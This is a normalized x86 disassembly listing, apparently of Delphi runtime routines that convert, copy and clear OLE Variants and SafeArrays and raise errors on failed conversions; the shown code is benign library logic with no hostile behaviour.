mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef49
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40ef4c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f191
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f198
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403fc8
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
dec eax
je r-xdata
call sub_40ed18
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
jmp r-xdata
call sub_40ee08
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b414
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
jmp r-xdata
sub_40f1ac
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40ed6c
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ee5c
jmp r-xdata
jmp r-xdata
call sub_40ef4c
sub_40f1e0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_402854
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
call sub_402854
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40f1ac
pop esi
pop ebx
retn
call sub_402854
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40f1ac
jmp r-xdata
call sub_402894
mov edx eax
mov eax edx
call sub_4039e0
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40f1ac
jmp r-xdata
pop esi
pop ebx
retn
sub_40f264
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40f2ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2b5
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40f2cc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f2fc
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f2fc
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f358
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40f1a0
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40f1a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f2cc
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40f1a0
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40f1a0
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40f2fc
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f1a0
mov eax [ ebp - 0x314 ]
call sub_40f550
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f4d4
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40f1a0
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403fa4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_415bdc
test al al
je r-xdata
mov eax ebx
call sub_40f358
jmp r-xdata
push ebx
call VariantClear
call sub_40f1a0
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f56c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f59c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f59c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f5f8
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40f1a0
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40f1a0
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f550
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40eef8
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40f1a0
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40f1a0
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f56c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f59c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f1a0
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40f1a0
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f7cc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f4d4
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40f1a0
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403ff8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_415bdc
test al al
je r-xdata
mov ecx sub_40f7c4
mov edx esi
mov eax ebx
call sub_40f5f8
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40f1a0
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f878
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f7cc
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f4d4
sub_40f8bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx esi
je r-xdata
push esi
push ebx
call VariantCopyInd
call sub_40f1a0
pop esi
pop ebx
retn
mov eax ebx
call sub_40f550
sub_40f8ec
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov edx esp
mov ax [ ebx ]
call sub_415bdc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f8bc
push 0x1
mov ecx ebx
mov edx esi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_40f920
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fae9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
and edx 0xffffbfff
cmp edx 0x14
ja r-xdata
test ah 0x20
je r-xdata
jmp [ edx * 4 + jump_table_40f955 ]
mov edx ebx
mov eax esi
call sub_40f8ec
mov ecx sub_40f8e4
mov edx ebx
mov eax esi
call sub_40f5f8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xfe
call sub_413958
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0xfc
call sub_413958
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413b50
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413b50
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
mov eax esi
call sub_413b78
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413b50
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f8dc
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_413c08
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov dx [ edx ]
neg dx
sbb edx edx
neg edx
call sub_413b28
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xff
call sub_413958
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x1
call sub_413958
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x2
call sub_413958
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0x4
call sub_413958
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
mov eax esi
call sub_413a54
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40faf8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f8bc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40faf0
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_40fb0c
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_404dcc
mov esi eax
mov eax ebx
call sub_40f550
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40fb34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fb90
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f878
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40fdbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb97
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_40fba0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fbde
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413208
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413c08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fbe5
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_40fbec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fc2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412ae0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fc31
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40fc38
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fc76
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4138ac
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fc7d
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_40fc84
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fcc2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4137e0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413c40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fcc9
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_40fcd0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40fdbc
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40f1ac
jmp r-xdata
mov edx esi
call sub_40ed6c
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40f1ac
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40fd50
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_415bdc
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40fb34
jmp r-xdata
mov edx esp
mov eax esi
call sub_415bdc
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40fcd0
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40fdbc
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f878
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fdbc
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fe01 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40fbec
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40f2b8
jmp r-xdata
mov eax ebx
call sub_410728
mov edx eax
mov eax esi
call sub_413a34
jmp r-xdata
mov eax ebx
call sub_410180
mov edx eax
mov eax esi
call sub_413994
jmp r-xdata
mov eax ebx
call sub_411aec
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413a80
jmp r-xdata
mov eax ebx
call sub_411754
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413aa4
jmp r-xdata
mov eax ebx
call sub_41242c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413ad0
jmp r-xdata
mov eax ebx
call sub_411ec4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413afc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fba0
jmp r-xdata
mov eax ebx
call sub_411240
mov edx eax
mov eax esi
call sub_413b28
jmp r-xdata
mov eax ebx
call sub_4105d0
mov edx eax
mov eax esi
call sub_413a14
jmp r-xdata
mov eax ebx
call sub_410680
mov edx eax
mov eax esi
call sub_4139b4
jmp r-xdata
mov eax ebx
call sub_410820
mov edx eax
mov eax esi
call sub_4139d4
jmp r-xdata
mov eax ebx
call sub_4108f8
mov edx eax
mov eax esi
call sub_4139f4
jmp r-xdata
mov eax ebx
call sub_410c44
push edx
push eax
mov eax esi
call sub_413a54
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fc38
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fc84
jmp r-xdata
mov dx 0x101
call sub_40ed6c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f550
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40fd50
xor edx edx
mov ax 0x1
call sub_40ed6c
jmp r-xdata
sub_40ffe8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41008b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_413208
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_40422c
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408598
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410092
lea eax [ ebp - 0xc ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_4046b0
retn
mov eax ebx
call sub_411240
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40f1ac
jmp r-xdata
sub_41009c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40f1ac
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_4100d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41012c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f878
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_410180
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410133
lea eax [ ebp - 0x14 ]
call sub_40f550
retn
sub_41013c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_410180
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4105a1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4101b3 ]
mov eax [ ebp - 0x4 ]
call sub_40ffe8
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ffe8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
